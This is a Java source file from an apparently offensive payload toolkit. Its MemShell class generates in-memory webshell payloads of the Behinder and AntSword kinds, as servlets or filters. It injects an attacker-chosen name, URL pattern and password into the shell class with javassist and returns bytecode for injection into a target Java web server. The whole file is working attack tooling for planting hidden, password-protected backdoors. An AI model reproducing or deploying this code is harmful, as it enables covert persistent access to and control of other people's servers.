package org.erosion2020.payloads;

import javassist.ClassPool;
import javassist.CtClass;
import org.erosion2020.memshell.AntSwordFilter;
import org.erosion2020.memshell.AntSwordServlet;
import org.erosion2020.memshell.BehinderFilter;
import org.erosion2020.memshell.BehinderServlet;
import org.erosion2020.payloads.annotation.Authors;
import org.erosion2020.util.CommandCursor;
import org.erosion2020.util.Gadgets;

import java.util.*;

@SuppressWarnings({"unchecked"})
@Authors({ Authors.EROSION_2020 })
public class MemShell implements ObjectPayload<Object> {

    private static final Map<String, Class> mem_cache = new HashMap<>();

    static {
        mem_cache.put("bx-filter", BehinderFilter.class);
        mem_cache.put("bx-servlet", BehinderServlet.class);
        mem_cache.put("yj-filter", AntSwordFilter.class);
        mem_cache.put("yj-servlet", AntSwordServlet.class);
    }

    @Override
    public Object getObject(String command) throws Exception {
        // init params
        CommandCursor commandCursor = new CommandCursor(command);
        String mem_type = commandCursor.next();
        String name = commandCursor.next();
        String pattern = commandCursor.next();
        String password = commandCursor.next();
        if(mem_type.startsWith("bx")){
            String md5 = Gadgets.md5(password);
            password = md5.substring(0, 16);
        }

        // init payload
        ClassPool rememberMe = ClassPool.getDefault();
        CtClass msClass = rememberMe.get(mem_cache.get(mem_type).getName());
        // create params
        msClass.makeClassInitializer().insertBefore(
                "name = \""+name+"\";" +
                        "pattern = \"" +pattern + "\";" +
                        "password = \""+password+"\";"
        );
        return msClass.toBytecode();
    }

}



